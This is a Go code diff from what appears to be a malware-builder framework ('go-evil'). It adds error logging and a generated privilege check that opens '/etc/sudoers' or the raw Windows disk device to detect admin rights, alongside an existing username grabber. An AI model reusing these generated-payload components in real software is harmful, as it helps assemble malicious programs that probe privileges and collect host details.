@@ -60,6 +60,10 @@ func generate_runtime_variable(s_json string) string {
 
 		"case 666:",
 		"grabbed_value = tools.Grab_username()",
+
+		"default:",
+		"notify.Log(fmt.Sprintf(\"Error, unknown value '%d'\", i_number), spine.logging, \"3\")",
+
 		"}",
 		"}",
 		"line = strings.ReplaceAll(line, value[1], grabbed_value)",
@@ -71,6 +75,7 @@ func generate_runtime_variable(s_json string) string {
 		"}"})
 
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 	data_object.Add_go_import("regexp")
 	data_object.Add_go_import("strings")
 
@@ -168,7 +173,20 @@ func generate_spine(s_json string) string {
 		"path string",
 		"alpha alpha_t",
 		"logging string",
+		"is_admin bool",
 		"}"})
+
+	body := []string{"func (obj *spine_t) check_privileges(){"}
+
+	if data_object.Target_os == "windows" {
+		body = append(body, "_, err := os.Open(\"\\\\.\\\\PHYSICALDRIVE0\")")
+	} else {
+		body = append(body, "_, err := os.Open(\"/etc/sudoers\")")
+	}
+
+	body = append(body, "if err != nil{", "obj.is_admin = false", "}else{", "obj.is_admin = true", "}", "}")
+
+	data_object.Add_go_function(body)
 
 	data_object.Add_go_global("var spine spine_t")
 	return structure.Send(data_object)
